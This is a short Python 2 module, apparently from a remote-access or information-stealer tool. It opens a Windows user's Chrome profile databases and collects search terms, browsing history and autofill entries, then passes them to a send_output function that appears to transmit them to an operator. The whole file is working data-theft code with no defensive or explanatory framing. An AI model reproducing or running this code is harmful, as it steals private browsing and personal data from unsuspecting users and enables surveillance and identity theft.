from __future__ import print_function
import os
from os import getenv
import sqlite3
import win32crypt
import sys
import time
import utils

reload(sys)
sys.setdefaultencoding('utf-8')


def run():
	KEYWORD_RESEARCH = ''
	HISTORY          = ''
	AUTOFILL         = ''

	conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
	conn3 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\History")
	conn1 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Web Data")
	conn4 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Web Data")
	cursor3 = conn3.cursor()
	cursor1 = conn1.cursor()
	cursor4 = conn4.cursor()
	cursor = conn.cursor()
		
	cursor3.execute("SELECT * FROM keyword_search_terms") 
	result3 = cursor3.fetchall() 

	for r3 in result3:
			KEYWORD_RESEARCH += str(r3[2] + '\n')
			
	cursor3.execute("SELECT * FROM urls") 
	result4 = cursor3.fetchall() 
	for r4 in result4:
			HISTORY += str('\n' + r4[1] + '\n')


	cursor4.execute("SELECT * FROM autofill")
	result1 = cursor4.fetchall() 
	for r6 in result1:
		AUTOFILL += str('\n' + r6[0] + ":       "+ r6[2])
		

	utils.send_output('KRC{{{' + KEYWORD_RESEARCH )
	utils.send_output('HIC{{{' + HISTORY )
	utils.send_output('AFC{{{' + AUTOFILL )
	

	



